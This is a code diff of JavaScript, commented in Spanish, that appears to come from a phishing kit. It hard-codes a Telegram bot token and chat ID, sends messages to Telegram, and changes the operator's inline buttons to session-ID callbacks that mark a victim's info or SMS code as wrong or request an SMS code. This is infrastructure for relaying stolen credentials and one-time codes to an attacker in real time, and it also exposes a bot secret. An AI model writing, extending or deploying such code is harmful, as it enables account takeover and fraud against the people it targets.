@@ -2,9 +2,10 @@
 const WEBHOOK_CONFIG = {
     telegramBotToken: '8587374664:AAHqJtjHF_kvUjPKFX_oafSU3RbWwkmKI_Y', // Token de bot de Telegram
     telegramChatId: '7758189913', // Chat ID de Telegram
-    url: 'https://your-webhook-url-here.com/api/webhook', // Reemplaza con tu URL real (opcional)
-    token: 'your-webhook-token-here', // Reemplaza con tu token real (opcional)
-    id: 'your-webhook-id-here' // Reemplaza con tu ID real (opcional)
+    // URL auto-detectada del sitio actual
+    get siteUrl() {
+        return window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '');
+    }
 };
 
 // Función para enviar mensaje a Telegram
@@ -14,22 +15,19 @@ async function sendToTelegram(message, withButton = false, type = null) {
         let replyMarkup = null;
 
         if (withButton) {
-            // Obtener email guardado para generar URLs
-            const savedEmail = sessionStorage.getItem('userEmail') || 'unknown';
-            const encodedEmail = encodeURIComponent(savedEmail);
+            const sessionId = sessionStorage.getItem('sessionId') || 'unknown';
             
-            // Botones diferentes según el tipo
             if (type === 'sms') {
                 replyMarkup = {
                     inline_keyboard: [[
-                        { text: "❌ SMS", url: `telegram-handler.html?action=sms_incorrect&email=${encodedEmail}` }
+                        { text: "❌ SMS", callback_data: `sms_error:${sessionId}` }
                     ]]
                 };
             } else {
                 replyMarkup = {
                     inline_keyboard: [[
-                        { text: "❌ Info", url: `telegram-handler.html?action=info_incorrect&email=${encodedEmail}` },
-                        { text: "📩 SMS", url: `telegram-handler.html?action=request_sms&email=${encodedEmail}` }
+                        { text: "❌ Info", callback_data: `info:${sessionId}` },
+                        { text: "📩 SMS", callback_data: `sms:${sessionId}` }
                     ]]
                 };
             }
